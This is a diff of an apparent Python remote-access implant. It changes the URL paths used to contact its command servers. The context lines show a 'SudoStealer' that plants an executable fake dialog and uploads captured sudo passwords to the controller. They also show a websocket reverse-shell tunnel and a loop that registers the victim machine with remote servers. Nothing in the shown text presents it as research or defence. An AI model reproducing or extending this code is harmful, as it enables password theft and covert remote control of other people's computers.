@@ -152,7 +152,7 @@ echo "$password"
 						f.write(SudoStealer.append)
 		
 		with open(SudoStealer.dialogpath, 'w') as f:
-			f.write(DIALOG.format(f"http://{current_host}/machines/api/{state['version']}/{state['uid']}/sudostealer/upload"))
+			f.write(DIALOG.format(f"http://{current_host}/machine/{state['version']}/{state['uid']}/sudostealer/upload"))
 		st = os.stat(SudoStealer.dialogpath)
 		os.chmod(SudoStealer.dialogpath, st.st_mode | stat.S_IEXEC)
 		state["sudostealer"]["enabled"] = True
@@ -251,7 +251,7 @@ class Shell:
 			os.close(slave_fd)
 	
 	async def start_shell(tunnel_id):
-		async with connect(f"ws://{current_host}/machines/api/{state['version']}/tunnel/{tunnel_id}") as websocket:
+		async with connect(f"ws://{current_host}/machine/{state['version']}/tunnel/{tunnel_id}") as websocket:
 			await Shell.shell_handler(websocket)
 
 def load_state():
@@ -294,7 +294,7 @@ async def main():
 		if not state["uid"]:
 			for server in state["servers"]:
 				try:
-					with urllib.request.urlopen(f"http://{server}/machines/api/{state['version']}/register/") as response:
+					with urllib.request.urlopen(f"http://{server}/machine/{state['version']}/register/") as response:
 						if response.code != 200: continue
 						state["uid"] = json.loads(response.read().decode())
 						save_state()
@@ -304,7 +304,7 @@ async def main():
 		
 		for server in state["servers"]:
 			try:
-				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
+				async with connect(f"ws://{server}/machine/{state['version']}/ws/{state['uid']}") as websocket:
 					current_host = server
 					ws = websocket
 					print("Joined")
